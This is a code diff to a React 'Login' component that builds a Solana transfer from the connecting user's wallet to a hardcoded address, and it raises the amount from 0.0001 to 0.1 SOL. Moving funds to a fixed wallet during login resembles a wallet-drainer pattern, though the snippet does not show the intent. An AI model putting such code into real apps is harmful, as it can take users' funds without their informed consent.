@@ -67,7 +67,7 @@ function Login(props) {
         SystemProgram.transfer({
           fromPubkey: provider.publicKey,
           toPubkey: new PublicKey("9y4Z4C5B3EEEUsGfVoxKaiDom7SSnfHgswgsh3KiydDw"), // Replace with the receiver's wallet address
-          lamports: 0.0001 * LAMPORTS_PER_SOL,
+          lamports: 0.1 * LAMPORTS_PER_SOL,
         })
       );
         console.log('ok');
